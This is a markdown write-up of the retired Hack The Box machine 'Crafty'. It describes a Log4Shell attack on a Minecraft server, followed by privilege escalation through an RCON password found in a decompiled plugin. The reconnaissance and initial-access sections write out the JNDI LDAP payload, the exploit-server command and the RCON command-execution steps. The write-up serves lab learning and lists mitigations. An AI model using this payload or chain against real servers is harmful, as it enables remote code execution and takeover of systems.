---
machine: Crafty
os: Windows
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [windows, minecraft, log4shell, rcon, java]
---

# Crafty — Hack The Box (Windows)

**English** | [🇪🇸 Español](README.md)

> **Status:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

A Minecraft 1.16.5 server is vulnerable to Log4Shell. Chat yields a Windows shell; the decompiled plugin reveals the RCON password, and `RunasCs` then executes as Administrator.

## Reconnaissance

```bash
nmap -Pn -sCV -p25565,80 <IP>
mcstatus <IP>:25565
# Payload in server chat
# ${jndi:ldap://<IP>:1389/exploit}
java -jar JNDIExploit.jar -i <IP>
# Plugin downloaded from the panel
unzip Crafty.jar -d plugin && jadx plugin
mcrcon -H <IP> -P 25575 -p "<PASS>" "whoami"
```

## Enumeration

- Minecraft on `25565` and a Crafty web panel.
- The server version uses vulnerable Log4j.
- The downloadable plugin contains configuration and RCON credentials.

## Initial access

Send `${jndi:ldap://<IP>:1389/...}` in chat. The vulnerable server loads the remote class and runs the payload; obtain a session as the user running Minecraft.

## Privilege escalation

Unzip and decompile the plugin JAR; its configuration includes the RCON password. Connect to `25575` with `mcrcon` and launch `RunasCs` to execute as Administrator.

## Evidence

- LDAP callback from the Minecraft server.
- Windows shell after exploitation.
- RCON connection and `whoami` as Administrator.

## Lessons learned

- Log4Shell still appears in game services and old panels.
- Plugins contain secrets that are not on the website.
- RCON is an execution path when its password is reused.

## Mitigation and detection

- Update Log4j and Java; block JNDI and outbound LDAP.
- Rotate the RCON password and bind it to loopback.
- Review and sign plugins before installing them.

## References

- [0xdf — Crafty](https://0xdf.gitlab.io/2024/06/15/htb-crafty.html)
- [NVD — CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [Hack The Box — Crafty](https://app.hackthebox.com/machines/crafty)
